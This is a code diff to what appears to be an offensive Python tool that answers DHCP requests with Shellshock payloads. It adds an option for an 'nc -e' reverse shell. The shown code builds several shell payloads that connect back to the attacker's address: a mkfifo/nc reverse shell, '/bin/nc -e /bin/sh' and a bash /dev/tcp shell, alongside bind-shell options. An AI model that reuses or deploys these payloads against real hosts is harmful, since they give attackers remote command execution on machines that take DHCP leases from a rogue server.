@@ -22,6 +22,7 @@ parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock
 parser.add_argument('-b', '--bind_shell', action='store_true', help='Use awk bind tcp shell in DHCP client')
 parser.add_argument('-p', '--bind_port', type=int, help='Set port for listen bind shell (default=1234)', default=1234)
 parser.add_argument('-N', '--nc_reverse_shell', action='store_true', help='Use nc reverse tcp shell in DHCP client')
+parser.add_argument('-E', '--nce_reverse_shell', action='store_true', help='Use nc -e reverse tcp shell in DHCP client')
 parser.add_argument('-R', '--bash_reverse_shell', action='store_true', help='Use bash reverse tcp shell in DHCP client')
 parser.add_argument('-e', '--reverse_port', type=int, help='Set port for listen bind shell (default=443)', default=443)
 parser.add_argument('-n', '--without_network', action='store_true', help='do not add network configure in payload')
@@ -276,6 +277,9 @@ def dhcp_reply(request):
                 if args.nc_reverse_shell:
                     payload = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
                               your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
+
+                if args.nce_reverse_shell:
+                    payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " &"
 
                 if args.bash_reverse_shell:
                     payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
